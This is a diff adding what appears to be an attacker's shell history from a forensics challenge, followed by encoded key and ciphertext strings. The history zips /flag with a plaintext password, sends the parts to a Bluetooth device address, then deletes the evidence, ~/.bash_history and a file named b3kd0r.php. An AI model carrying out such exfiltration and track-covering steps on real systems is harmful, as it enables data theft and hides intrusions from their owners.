@@ -1,0 +1,48 @@
+cd ..
+ls -la
+echo "hai sayang"
+zip -s 128k -er encrypted.zip /flag
+QWERTYPASSWORD123456
+QWERTYPASSWORD123456
+mv encrypted.z01 encrypted.01.zip
+mv encrypted.z02 encrypted.02.zip
+bluetooth-sendto --device=48:88:ca:b1:81:b3 encrypted.01.zip
+bluetooth-sendto --device=48:88:ca:b1:81:b3 encrypted.02.zip
+bluetooth-sendto --device=48:88:ca:b1:81:b3 encrypted.zip
+echo "hai sayang"
+echo "hai sayang"
+rm -r flag/
+rm encrypted.*
+rm ~/.bash_history
+rm b3kd0r.php
+
+!A%D*G-JaNdRgUkX.qPg8Cj4q+EAY3jc9PuyL4w==
+
+aNdRfUjXn2r5u8x/.l8I+33k15vMqn4S8qX2s9A==
+
+)J@McQfTjWnZr4u7.b6Zhu1+emDu4kZ9xJrDC4yECECKcvjJjeiVbUSgnuhT3tkqKoQvGc4c6WA6FjzCH
+
+p2s5v8y/B?E(H+Mb.meFdjcRKM6CVzGvORg3dXCkJ+j04dL3EJsbnz669q40=
+
+J@NcRfUjXn2r5u7x.TuJ1+NZmW9njfeIqJcWw5O2jrhh8uRI6kNx5ydRf+Cs=
+
+dRgUkXp2s5u8x/A?.kXoTCEyF8/aVnwjREVnpcycvxM/gKsTzaKM2ne3OPQ7h7Fb1ip1l/SmA4z/F8Vjg
+
+kXp2s5v8y/B?E(H+.GMeHrMnPAuVCZxhFPAYgyRFcIInrShd8YJBi07Rckmx4Ub5HxCqTPRUpu9bbMqbr
+
+hWmZq4t7w!z%C*F-.QVDoWyJwIQ+uTDBdRu2l5Kuxt6ecLLa+duVxrwP3IuQ/ZsIerJZ69iHASLVlZOrNnLrLFNC9Q7eYYVqrM2PVuQ==
+
+ShVmYq3t6w9z$C&F.yIh5DPAqsadQcr02r1ifGaMGuFrVnSXe2W2AzGzUoCNw0gendJ/S2npcY9ReepHA/a5a5vC1D80NgwDpb3SMTQ==
+
+7x!A%D*G-KaPdSgV.4sEmQe+1Ze4pAwPNa0FfM+Vgy3ZW5sXNo3ICeGHy53zksuneQlahV4xnru/5/b6RWLW18YgdDK73pFNAK2np7Q==
+
+3s6v9y$B&E)H@McQ.j3V+6AHoRKmATJv8BQt+HKT8sKREefvBV/2sOFqYpOI=
+
+-KaPdSgVkXp2s5v8.1qO7b7QQvQJL3llW5xigCiTTkAZri8qWmkhyZmdKq3Y=
+
+p3s6v9y$B&E)H@Mb.fGoZWY2nQ3IhLe4Xq4BzSg==
+
+%D*F-JaNdRgUkXp2.KmIKE54pyNEf+KmszbxNKw==
+
+?D(G+KbPeSgVkYp3.Yrji4gFwcgqo+enTBdZ+BW/sI64uxAxic5ZWvRiIz90=
+
